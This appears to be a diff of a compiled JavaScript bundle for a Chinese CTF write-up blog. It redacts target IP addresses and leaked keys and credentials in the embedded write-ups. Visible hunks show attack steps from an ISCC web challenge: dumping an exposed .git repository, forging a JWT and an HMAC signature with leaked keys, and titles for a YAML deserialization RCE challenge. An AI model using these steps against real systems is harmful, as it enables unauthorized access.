@@ -1,4 +1,4 @@
-import{j as e,T as u,A as y}from"./index-DEk_66Wj.js";import{e as x,r as _,L as n}from"./react-vendor-Dg1TH6cw.js";import{M as C,h as b,t as f,R as P,T,A as g,S as F,a as k,r as S,b as w,c as E,d as L,e as I,C as R}from"./TableOfContents-D0v5nRRp.js";import{m as r}from"./framer-motion-Ce_fMeXQ.js";import"./share-2-12VwQVgV.js";import"./timeAgo-B6WwoOZr.js";import"./TurnstileBox-D3Deajd9.js";const p={tools:{title:"CTF 工具使用指南",subtitle:"CTF Tools Guide",content:`
+import{j as e,T as u,A as y}from"./index-CIqCCU84.js";import{e as x,r as _,L as n}from"./react-vendor-Dg1TH6cw.js";import{M as C,h as b,t as f,R as T,T as P,A as g,S as F,a as k,r as S,b as w,c as E,d as L,e as I,C as R}from"./TableOfContents-Dr4z0hzS.js";import{m as r}from"./framer-motion-Ce_fMeXQ.js";import"./share-2-Bm7J9LPD.js";import"./timeAgo-CGJI3TIE.js";import"./TurnstileBox-oLpc1Qvj.js";const p={tools:{title:"CTF 工具使用指南",subtitle:"CTF Tools Guide",content:`
 CTF 比赛中工具的使用至关重要。这里总结了我常用的工具及其使用技巧。
 
 ## IDA Pro — 逆向分析神器
@@ -800,7 +800,7 @@ if ($key === "secret_value") { ... }
 
 ## 一、ISCC CTF Web (解出 🔥)
 
-**题目**: \`http://39.105.213.28:49106\`
+**题目**: \`http://<靶机地址>:49106\`
 **FLAG**: \`ISCC{K6FRFyHAMaMmPZNmXXpA}\`
 
 ### 攻击链
@@ -808,7 +808,7 @@ if ($key === "secret_value") { ... }
 #### 1. \`.git\` 源码泄露
 \`\`\`bash
 # 用 git_dumper 克隆仓库
-python git_dumper.py http://39.105.213.28:49106/.git/ ./iscc_git/
+python git_dumper.py http://<靶机地址>:49106/.git/ ./iscc_git/
 
 # 查看 git 历史，找到旧版本
 git log --all --oneline
@@ -816,13 +816,13 @@ git show <commit_id>:legacy_probe_stub.py
 \`\`\`
 
 从 \`.git/objects\` 中还原了旧版 \`legacy_probe_stub.py\`，获取两个关键密钥：
-- **JWT 密钥**: \`ISCC_2026_JWT_DEBUG_KEY_#9527\`
-- **旧版 HMAC 密钥**: \`ISCC_SERVER_SECRET_REAL\`
+- **JWT 密钥**: \`ISCC_2026_JWT_DEBUG_KEY_[REDACTED]\`
+- **旧版 HMAC 密钥**: \`ISCC_SERVER_SECRET_[REDACTED]\`
 
 #### 2. 登录
 \`\`\`
 用户名: auditor
-密码: audit2025
+密码: [REDACTED]
 \`\`\`
 （从 git 历史或源码中找到的凭据）
 
@@ -830,7 +830,7 @@ git show <commit_id>:legacy_probe_stub.py
 \`\`\`python
 import jwt
 payload = {"sub": "auditor_id", "role": "auditor", "exp": 9999999999}
-token = jwt.encode(payload, "ISCC_2026_JWT_DEBUG_KEY_#9527", algorithm="HS256")
+token = jwt.encode(payload, "ISCC_2026_JWT_DEBUG_KEY_[REDACTED]", algorithm="HS256")
 # 将 token 填入 Cookie: jwt_token=xxx
 \`\`\`
 
@@ -850,7 +850,7 @@ node_id = "core-storage-01"
 timestamp = str(int(time.time()))
 msg = f"{node_id}:{timestamp}"
 sig = hmac.new(
-    "ISCC_SERVER_SECRET_REAL".encode(),
+    "ISCC_SERVER_SECRET_[REDACTED]".encode(),
     msg.encode(),
     hashlib.sha256
 ).hexdigest()
@@ -1129,7 +1129,7 @@ flag{It3_D3bugG_T11me!_le3_play}
 `},yaml:{title:"喵喵宠物医院 -- YAML 反序列化 RCE",subtitle:"PyYAML 标签绕过",icon:"Zap",color:"orange",content:`
 # 喵喵宠物医院 -- YAML 反序列化 RCE
 
-**靶场**: 175.27.251.122:10001
+**靶场**: <靶机地址>:10001
 **类型**: Misc / Insecure Deserialization
 **难度**: Medium
 
@@ -2386,4 +2386,4 @@ moectf{1t_i5_So0o0o0o_Obv1ou5}
 2. **bkcrack 的进度用 \`\\r\` 刷屏**：直接跑会淹没管道、被判定为卡死。要 \`> bk.log 2>&1\` 重定向到日志文件后台跑，再用 \`tr '\\r' '\\n' < bk.log\` 看结果
 3. **下载 bkcrack 别照抄旧版本号**：v1.7.0 的 release URL 已经 404，用 GitHub API \`repos/kimci86/bkcrack/releases/latest\` 拿最新版本号（写这篇时是 v1.8.1）
 4. **Python 自带 \`zipfile\` 的 ZipCrypto 是纯 Python 实现**，比 bkcrack 慢几十倍，别拿它爆破
-`}};function N({children:s}){return e.jsx("p",{className:"text-cyber-grid leading-relaxed my-3",children:s})}const o=["tools","infoleak","php","cmd","pwn","stego","re-plzdebugme","misc","may-2026","qingcen-web-2026-06-10","northbridge","qc733","qc734","qc747","yaml","timing","typejuggling","sourceleak","sigforge","notallmilk","0xgame2025","gift","moectf-emoji","moectf-zipcrypto"];function j(s){const a=s.replace(/[#*`\[\]()]/g,"").length;return Math.ceil(a/500)}function U(){const{id:s}=x(),a=p[s],i=o.indexOf(s),l=i>0?{id:o[i-1],...p[o[i-1]]}:null,d=i<o.length-1?{id:o[i+1],...p[o[i+1]]}:null,h=_.useMemo(()=>({code:C,p:N,hr(){return e.jsx("hr",{className:"my-8 border-t border-cyber-grid/30"})},h2({children:t}){const c=b(f(t));return e.jsx("h2",{id:c,className:"text-2xl font-bold text-cyber-cyan mt-8 mb-4 anime-title scroll-mt-20",children:t})},h3({children:t}){const c=b(f(t));return e.jsx("h3",{id:c,className:"text-xl font-bold text-cyber-purple mt-6 mb-3 scroll-mt-20",children:t})},strong({children:t}){return e.jsx("strong",{className:"text-cyber-cyan font-bold",children:t})},a({href:t,children:c}){return e.jsx("a",{href:t,className:"text-cyber-purple hover:text-cyber-cyan underline",target:"_blank",rel:"noopener noreferrer",children:c})},table({children:t}){return e.jsx("div",{className:"overflow-x-auto my-4",children:e.jsx("table",{className:"min-w-full border border-cyber-grid/30",children:t})})},thead({children:t}){return e.jsx("thead",{className:"bg-cyber-darker",children:t})},th({children:t}){return e.jsx("th",{className:"px-4 py-2 text-left text-cyber-cyan font-mono text-sm border-b border-cyber-grid/30",children:t})},td({children:t}){return e.jsx("td",{className:"px-4 py-2 text-cyber-grid text-sm border-b border-cyber-grid/20",children:t})},ul({children:t}){return e.jsx("ul",{className:"list-disc list-inside text-cyber-grid my-2 space-y-1",children:t})},ol({children:t}){return e.jsx("ol",{className:"list-decimal list-inside text-cyber-grid my-2 space-y-1",children:t})},li({children:t}){return e.jsx("li",{className:"text-cyber-grid",children:t})}}),[]);if(!a)return e.jsx("div",{className:"min-h-screen flex items-center justify-center",children:e.jsxs("div",{className:"text-center",children:[e.jsx("h1",{className:"text-4xl font-bold text-cyber-cyan mb-4",children:"404"}),e.jsx("p",{className:"text-cyber-grid",children:"文章不存在"}),e.jsx(n,{to:"/",className:"text-cyber-purple hover:text-cyber-cyan mt-4 inline-block",children:"返回首页"})]})});const m=j(a.content);return e.jsxs(e.Fragment,{children:[e.jsx(P,{}),e.jsx(T,{content:a.content}),e.jsx(r.div,{initial:{opacity:0},animate:{opacity:1},className:"min-h-screen py-12 sm:py-20",children:e.jsxs("div",{className:"max-w-4xl mx-auto px-4 sm:px-6 lg:pr-72",children:[e.jsx(n,{to:"/",children:e.jsxs(r.button,{whileHover:{x:-5},className:"flex items-center gap-2 text-cyber-grid hover:text-cyber-cyan transition-colors mb-8",children:[e.jsx(g,{className:"w-4 h-4"}),e.jsx("span",{className:"font-mono text-sm",children:"返回首页"})]})}),e.jsxs(r.div,{initial:{y:20},animate:{y:0},className:"mb-12",children:[e.jsxs("div",{className:"flex items-center gap-2 mb-4",children:[e.jsx(u,{className:"w-5 h-5 text-cyber-purple"}),e.jsx("span",{className:"text-cyber-purple/70 text-sm font-mono tracking-widest",children:"▶ WRITEUP"})]}),e.jsx("h1",{className:"text-4xl md:text-5xl font-bold text-gradient anime-title mb-2",children:a.title}),e.jsxs("div",{className:"flex items-center gap-4 text-cyber-grid text-lg font-mono",children:[e.jsx("span",{children:a.subtitle}),e.jsx("span",{className:"text-cyber-grid/50",children:"·"}),e.jsxs("span",{className:"text-cyber-cyan/70",children:[m," 分钟阅读"]}),e.jsx(F,{title:a.title})]})]}),e.jsx(r.div,{initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{delay:.2},className:"cyber-card p-4 sm:p-8",children:e.jsx("div",{className:"prose prose-invert max-w-none",children:e.jsx(k,{remarkPlugins:[E,L],rehypePlugins:[S,w],components:h,children:a.content})})}),e.jsx(I,{kind:"article",id:s}),e.jsx(R,{page:"/article/"+s}),e.jsxs(r.div,{initial:{opacity:0},animate:{opacity:1},transition:{delay:.4},className:"mt-8 grid grid-cols-1 sm:grid-cols-2 gap-4",children:[l?e.jsx(n,{to:`/article/${l.id}`,children:e.jsxs(r.div,{whileHover:{x:-5},className:"glass-card p-4 cursor-pointer group neon-border-hover",children:[e.jsxs("div",{className:"flex items-center gap-2 text-cyber-grid/70 text-xs font-mono mb-1",children:[e.jsx(g,{className:"w-3 h-3"}),"上一篇"]}),e.jsx("div",{className:"text-cyber-cyan group-hover:text-white transition-colors font-bold",children:l.title})]})}):e.jsx("div",{}),d?e.jsx(n,{to:`/article/${d.id}`,children:e.jsxs(r.div,{whileHover:{x:5},className:"glass-card p-4 cursor-pointer group neon-border-hover text-right",children:[e.jsxs("div",{className:"flex items-center justify-end gap-2 text-cyber-grid/70 text-xs font-mono mb-1",children:["下一篇",e.jsx(y,{className:"w-3 h-3"})]}),e.jsx("div",{className:"text-cyber-cyan group-hover:text-white transition-colors font-bold",children:d.title})]})}):e.jsx("div",{})]})]})})]})}export{U as default};
+`}};function N({children:s}){return e.jsx("p",{className:"text-cyber-grid leading-relaxed my-3",children:s})}const o=["tools","infoleak","php","cmd","pwn","stego","re-plzdebugme","misc","may-2026","qingcen-web-2026-06-10","northbridge","qc733","qc734","qc747","yaml","timing","typejuggling","sourceleak","sigforge","notallmilk","0xgame2025","gift","moectf-emoji","moectf-zipcrypto"];function A(s){const a=s.replace(/[#*`\[\]()]/g,"").length;return Math.ceil(a/500)}function D(){const{id:s}=x(),a=p[s],i=o.indexOf(s),l=i>0?{id:o[i-1],...p[o[i-1]]}:null,d=i<o.length-1?{id:o[i+1],...p[o[i+1]]}:null,h=_.useMemo(()=>({code:C,p:N,hr(){return e.jsx("hr",{className:"my-8 border-t border-cyber-grid/30"})},h2({children:t}){const c=b(f(t));return e.jsx("h2",{id:c,className:"text-2xl font-bold text-cyber-cyan mt-8 mb-4 anime-title scroll-mt-20",children:t})},h3({children:t}){const c=b(f(t));return e.jsx("h3",{id:c,className:"text-xl font-bold text-cyber-purple mt-6 mb-3 scroll-mt-20",children:t})},strong({children:t}){return e.jsx("strong",{className:"text-cyber-cyan font-bold",children:t})},a({href:t,children:c}){return e.jsx("a",{href:t,className:"text-cyber-purple hover:text-cyber-cyan underline",target:"_blank",rel:"noopener noreferrer",children:c})},table({children:t}){return e.jsx("div",{className:"overflow-x-auto my-4",children:e.jsx("table",{className:"min-w-full border border-cyber-grid/30",children:t})})},thead({children:t}){return e.jsx("thead",{className:"bg-cyber-darker",children:t})},th({children:t}){return e.jsx("th",{className:"px-4 py-2 text-left text-cyber-cyan font-mono text-sm border-b border-cyber-grid/30",children:t})},td({children:t}){return e.jsx("td",{className:"px-4 py-2 text-cyber-grid text-sm border-b border-cyber-grid/20",children:t})},ul({children:t}){return e.jsx("ul",{className:"list-disc list-inside text-cyber-grid my-2 space-y-1",children:t})},ol({children:t}){return e.jsx("ol",{className:"list-decimal list-inside text-cyber-grid my-2 space-y-1",children:t})},li({children:t}){return e.jsx("li",{className:"text-cyber-grid",children:t})}}),[]);if(!a)return e.jsx("div",{className:"min-h-screen flex items-center justify-center",children:e.jsxs("div",{className:"text-center",children:[e.jsx("h1",{className:"text-4xl font-bold text-cyber-cyan mb-4",children:"404"}),e.jsx("p",{className:"text-cyber-grid",children:"文章不存在"}),e.jsx(n,{to:"/",className:"text-cyber-purple hover:text-cyber-cyan mt-4 inline-block",children:"返回首页"})]})});const m=A(a.content);return e.jsxs(e.Fragment,{children:[e.jsx(T,{}),e.jsx(P,{content:a.content}),e.jsx(r.div,{initial:{opacity:0},animate:{opacity:1},className:"min-h-screen py-12 sm:py-20",children:e.jsxs("div",{className:"max-w-4xl mx-auto px-4 sm:px-6 lg:pr-72",children:[e.jsx(n,{to:"/",children:e.jsxs(r.button,{whileHover:{x:-5},className:"flex items-center gap-2 text-cyber-grid hover:text-cyber-cyan transition-colors mb-8",children:[e.jsx(g,{className:"w-4 h-4"}),e.jsx("span",{className:"font-mono text-sm",children:"返回首页"})]})}),e.jsxs(r.div,{initial:{y:20},animate:{y:0},className:"mb-12",children:[e.jsxs("div",{className:"flex items-center gap-2 mb-4",children:[e.jsx(u,{className:"w-5 h-5 text-cyber-purple"}),e.jsx("span",{className:"text-cyber-purple/70 text-sm font-mono tracking-widest",children:"▶ WRITEUP"})]}),e.jsx("h1",{className:"text-4xl md:text-5xl font-bold text-gradient anime-title mb-2",children:a.title}),e.jsxs("div",{className:"flex items-center gap-4 text-cyber-grid text-lg font-mono",children:[e.jsx("span",{children:a.subtitle}),e.jsx("span",{className:"text-cyber-grid/50",children:"·"}),e.jsxs("span",{className:"text-cyber-cyan/70",children:[m," 分钟阅读"]}),e.jsx(F,{title:a.title})]})]}),e.jsx(r.div,{initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{delay:.2},className:"cyber-card p-4 sm:p-8",children:e.jsx("div",{className:"prose prose-invert max-w-none",children:e.jsx(k,{remarkPlugins:[E,L],rehypePlugins:[S,w],components:h,children:a.content})})}),e.jsx(I,{kind:"article",id:s}),e.jsx(R,{page:"/article/"+s}),e.jsxs(r.div,{initial:{opacity:0},animate:{opacity:1},transition:{delay:.4},className:"mt-8 grid grid-cols-1 sm:grid-cols-2 gap-4",children:[l?e.jsx(n,{to:`/article/${l.id}`,children:e.jsxs(r.div,{whileHover:{x:-5},className:"glass-card p-4 cursor-pointer group neon-border-hover",children:[e.jsxs("div",{className:"flex items-center gap-2 text-cyber-grid/70 text-xs font-mono mb-1",children:[e.jsx(g,{className:"w-3 h-3"}),"上一篇"]}),e.jsx("div",{className:"text-cyber-cyan group-hover:text-white transition-colors font-bold",children:l.title})]})}):e.jsx("div",{}),d?e.jsx(n,{to:`/article/${d.id}`,children:e.jsxs(r.div,{whileHover:{x:5},className:"glass-card p-4 cursor-pointer group neon-border-hover text-right",children:[e.jsxs("div",{className:"flex items-center justify-end gap-2 text-cyber-grid/70 text-xs font-mono mb-1",children:["下一篇",e.jsx(y,{className:"w-3 h-3"})]}),e.jsx("div",{className:"text-cyber-cyan group-hover:text-white transition-colors font-bold",children:d.title})]})}):e.jsx("div",{})]})]})})]})}export{D as default};
